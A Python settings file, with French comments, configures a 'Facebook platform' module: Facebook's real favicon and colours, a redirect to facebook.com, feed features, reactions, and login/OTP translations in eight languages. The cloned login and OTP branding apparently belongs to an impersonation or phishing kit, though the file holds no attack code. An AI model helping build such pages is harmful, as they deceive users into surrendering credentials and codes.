"""settings.py — Configuration de la plateforme Facebook.

Contient :
  • CAPABILITIES : capacités de la plateforme (feed, publications, ads, etc.)
  • PLATFORM_INFO : métadonnées (nom, couleurs, favicon, etc.)
  • TRANSLATIONS : traductions login/OTP (8 langues)
  • FEED_TRANSLATIONS : traductions du feed (8 langues)
  • REACTIONS_MAP : types de réactions (like, love, care, haha, wow, sad, angry)
  • FEED_COLORS : palette de couleurs du feed
  • MOBILE_ONLY : False (Facebook supporte PC + mobile)
"""

# ════════════════════════════════════════════════════════════════════
#  Métadonnées de la plateforme
# ════════════════════════════════════════════════════════════════════
PLATFORM_INFO = {
    "name":             "Facebook",
    "icon":             "f",
    "default_redirect": "https://www.facebook.com",
    "favicon":          "https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico",
    "primary_color":    "#1877f2",
    "button_color":     "#0866FF",
    "bg_color":         "#f0f2f5",
    "footer_text":      "Meta",
}

# ════════════════════════════════════════════════════════════════════
#  Capacités de la plateforme
# ════════════════════════════════════════════════════════════════════
CAPABILITIES = {
    'feed':            True,
    'publications':    True,
    'reactions':       True,
    'audiences':       ['Public', 'Amis', 'Amis de mes amis', 'Sponsorisé', 'Privé'],
    'stories':         True,
    'music':           True,
    'video':           True,
    'share':           True,
    'links':           True,
    'groups':          True,
    'tags':            True,
    'blur':            True,
    'sim_action':      True,
    'ads':             True,
    'reaction_types':  ['like', 'love', 'care', 'haha', 'wow', 'sad', 'angry'],
    'follow_label':    "S'abonner",
    'video_mode':      'facebook_post',
}

# Facebook n'est pas mobile-only (supporte PC + mobile)
MOBILE_ONLY = False

# ════════════════════════════════════════════════════════════════════
#  Types de réactions (icônes Font Awesome + couleurs)
# ════════════════════════════════════════════════════════════════════
REACTIONS_MAP = {
    "like":  {"icon": "fa-thumbs-up",    "color": "#0866FF"},
    "love":  {"icon": "fa-heart",        "color": "#F33E58"},
    "care":  {"icon": "fa-hand-holding-heart", "color": "#F7B125"},
    "haha":  {"icon": "fa-laugh-squint", "color": "#F7B125"},
    "wow":   {"icon": "fa-surprise",     "color": "#F7B125"},
    "sad":   {"icon": "fa-sad-tear",     "color": "#F7B125"},
    "angry": {"icon": "fa-angry",        "color": "#E9710F"},
}

# ════════════════════════════════════════════════════════════════════
#  Palette de couleurs du feed (16 couleurs)
# ════════════════════════════════════════════════════════════════════
FEED_COLORS = [
    "transparent", "#1877f2", "#000000", "#ffffff", "#0866FF",
    "#42A5F5", "#1B6DD0", "#00C2CB", "#0095F6", "#8A3AB9",
    "#5851DB", "#833AB4", "#C13584", "#E1306C", "#FD1D1D", "#F77737"
]


# ════════════════════════════════════════════════════════════════════
#  Traductions login/OTP (8 langues)
# ════════════════════════════════════════════════════════════════════
def _load_translations():
    """Charge les traductions login/OTP depuis helpers.py.
    Retourne un dict {lang_code: {key: value}}."""
    try:
        from helpers import get_translations
        return {lg: get_translations(lg) for lg in ['en', 'fr', 'es', 'pt', 'ar', 'de', 'it', 'zh']}
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("facebook.settings._load_translations", e)
        except Exception:
            pass
        return {'en': {}, 'fr': {}}

def _load_feed_translations():
    """Charge les traductions du feed depuis helpers.py.
    Retourne un dict {lang_code: {key: value}}."""
    try:
        from helpers import get_feed_translations
        return {lg: get_feed_translations(lg) for lg in ['en', 'fr', 'es', 'pt', 'ar', 'de', 'it', 'zh']}
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("facebook.settings._load_feed_translations", e)
        except Exception:
            pass
        return {'en': {}, 'fr': {}}

# Charger les traductions au moment de l'import
TRANSLATIONS = _load_translations()
FEED_TRANSLATIONS = _load_feed_translations()
